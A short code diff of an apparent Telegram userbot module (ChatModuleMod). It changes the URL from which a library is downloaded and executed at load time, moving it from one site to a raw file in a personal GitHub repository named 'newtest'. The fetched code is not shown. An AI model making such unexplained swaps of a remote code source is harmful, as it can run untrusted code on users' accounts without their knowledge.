@@ -185,7 +185,7 @@ class ChatModuleMod(loader.Module):
         self._client = client
         self._db = db
         self.xdlib = await self.import_lib(
-            "https://mods.xdesai.top/xdlib.py",
+            "https://github.com/qqsharki4/newtest/raw/refs/heads/main/xdlib.py",
             suspend_on_error=True,
         )
         self._roles = self.xdlib._db.pointer(
